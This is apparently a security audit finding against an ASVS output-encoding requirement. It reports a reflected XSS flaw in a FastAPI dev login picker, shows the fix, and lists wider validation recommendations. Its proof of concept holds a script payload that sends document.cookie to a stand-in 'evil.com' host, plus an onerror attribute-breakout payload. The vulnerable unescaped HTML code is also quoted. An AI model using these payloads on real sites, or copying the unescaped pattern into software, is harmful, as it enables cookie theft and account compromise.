## ASVS-1.2.1: Output Encoding for HTTP Response

### Findings for 1.2.1

### [HIGH]
**Finding ID**: ASVS-121-HIGH-001  
**Title**: Reflected XSS in dev_stub_picker HTML generation — user input interpolated without HTML encoding  
**Location**: `routes_auth.py`, `dev_stub_picker`, lines ~197-215

```python
@router.get("/auth/dev-stub-picker", response_class=HTMLResponse)
async def dev_stub_picker(
    request: Request,
    state: str = Query(...),
    redirect_uri: str = Query(...),
    users: str = Query(...),
) -> HTMLResponse:
    user_list = [u for u in users.split(",") if u]
    # ...
    links = "".join(
        f'<li><a href="/auth/callback/dev_stub?code={u}&state={state}">{u}</a></li>'
        for u in user_list
    )
    html = f"""<!doctype html>
<html>
  <head><title>Dev stub login</title></head>
  <body style="font-family: sans-serif; max-width: 600px; margin: 60px auto;">
    <h1>Dev stub login</h1>
    <p>Not for production. Pick a configured user to sign in as:</p>
    <ul>{links}</ul>
  </body>
</html>"""
    return HTMLResponse(content=html)
```

**Data flow**: Query parameter `users` → `user_list` (split on comma) → `{u}` interpolated into HTML href attribute AND element content → `{state}` interpolated into HTML href attribute → returned as `text/html`  
**Proof of concept**:
```
GET /auth/dev-stub-picker?state=x&redirect_uri=x&users=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```
Or attribute breakout:
```
GET /auth/dev-stub-picker?state="><img+src=x+onerror=alert(document.domain)>&redirect_uri=x&users=test
```
**Issue**: The `users` and `state` query parameters are directly interpolated into an HTML document without any HTML entity encoding. This endpoint is accessible on any deployment where the auth router is mounted (i.e., when ANY auth provider is enabled, not just dev_stub). The `_render_deny_page` function correctly uses `html.escape()` but this pattern was not applied to `dev_stub_picker`.  
**Gap Type**: Type B — the control (`html.escape`) EXISTS in the same file but is NOT CALLED here.  
**Impact**: Reflected XSS allowing cookie theft (session cookies are httponly, but other cookies or DOM data may be accessible), phishing via DOM manipulation, or CSRF token extraction if any are present in the page.  
**Remediation**:

```python
import html as _html
from urllib.parse import quote

@router.get("/auth/dev-stub-picker", response_class=HTMLResponse)
async def dev_stub_picker(...) -> HTMLResponse:
    user_list = [u for u in users.split(",") if u]
    links = "".join(
        f'<li><a href="/auth/callback/dev_stub?code={quote(u)}&state={quote(state)}">{_html.escape(u)}</a></li>'
        for u in user_list
    )
    # ...
```

## Cross-cutting Architecture Observations

1. **Dual HTML-serving and API-serving role**: While the domain context states "FastAPI serves API endpoints, not HTML," the auth router serves multiple HTML pages (`dev_stub_picker`, `_render_deny_page`). These HTML-generating endpoints have inconsistent security controls — one uses `html.escape()` while the other does not.

2. **Validation exists but coverage is incomplete**: The codebase demonstrates awareness of input validation (regex patterns, Literal types, mutual exclusivity validators) but these are applied inconsistently. Business-critical inputs like billing amounts, LLM parameters, and deployed agent inputs lack the same rigor.

3. **Type B gaps are the most significant risk**: The `input_schema` field exists on every agent but is never validated at the `/rest/{friendly_name}` entry point. The `html.escape` function is imported and used in one HTML generator but not another. These "control exists but not applied" gaps are more dangerous than missing controls because they create false confidence.

4. **Output encoding is generally correct for JSON contexts**: The application primarily operates as a JSON API where FastAPI/Pydantic handle serialization correctly. The XSS risks are concentrated in the few HTML-generating endpoints in the auth router.

5. **Open redirect risk in OAuth flow**: The post-authentication redirect accepts arbitrary absolute URLs, which is a common OAuth implementation mistake. The CSRF protection (state parameter) is well-implemented but doesn't protect against attacker-initiated flows with malicious `return_to` values.

## Cross-cutting Recommendations

### Immediate (Fix within current sprint)

1. **Fix XSS in `dev_stub_picker`** (ASVS-121-HIGH-001): Apply `html.escape()` and `urllib.parse.quote()` to all user-controlled values interpolated into HTML/URLs. This is a 5-line fix in a single function.

2. **Fix open redirect in `login_callback`** (ASVS-122-HIGH-001): Validate that absolute `return_to` URLs match the configured `FRONTEND_URL` domain. Reject or ignore external domains.

3. **Add input validation to `/rest/{friendly_name}`** (ASVS-221-HIGH-001): Validate incoming JSON against the agent's declared `input_schema` before execution.

### Short-term (Next 2-4 weeks)

4. **Add range constraints to numeric fields**: Apply `ge`, `le`, `gt`, `lt` constraints to billing amounts, LLM parameters, and other business-critical numbers.

5. **Validate provider/model against known values**: Add model validators to `ChatRequest` and `ProviderConfig` that check against `PROVIDER_CONFIG`.

6. **Add `max_length` to string fields**: Especially `ChatMessage.content`, agent `name`/`description`, and API key values.

7. **Validate URL protocols on SSRF-sensitive inputs**: Use `AnyHttpUrl` or custom validators for `FetchSpecRequest.url` and `ListMcpToolsRequest.mcp_url`.

### Long-term (Next quarter)

8. **Create a validation specification document**: Document all input validation rules in a central specification that maps each endpoint's expected formats, ranges, and constraints. This satisfies ASVS 2.1.1 fully.

9. **Implement request body size limits**: Add middleware or FastAPI configuration to limit maximum request body size, protecting against memory exhaustion attacks on unbounded string fields.

10. **Add JSON Schema validation middleware for deployed agents**: Create a reusable middleware that validates request bodies against stored schemas, making the `input_schema` field enforceable rather than advisory.
